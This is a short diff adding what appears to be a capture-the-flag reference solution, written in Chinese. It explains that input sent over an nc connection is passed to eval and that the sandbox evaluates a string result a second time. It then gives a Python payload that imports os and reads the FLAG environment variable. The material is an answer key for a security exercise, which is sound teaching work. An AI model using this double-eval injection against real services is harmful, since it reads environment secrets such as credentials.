@@ -1,0 +1,4 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+# 第一次 eval 得到此字符串，沙箱会对字符串结果再 eval 一次
+'__import__("os").environ["FLAG"]'
